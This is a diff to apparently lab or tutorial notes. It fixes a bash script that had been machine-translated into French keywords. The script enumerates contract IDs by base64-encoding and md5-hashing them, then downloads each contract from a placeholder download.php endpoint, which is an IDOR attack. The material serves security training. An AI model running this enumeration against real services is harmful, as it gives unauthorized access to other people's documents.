@@ -104,11 +104,13 @@ Code : bash
 ```
 #!/bin/bash
 
-pour je dans {1..10} ; faire
-     pour le hachage dans $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); faire
-         curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
-     fait
-fait
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
 
 ```
 
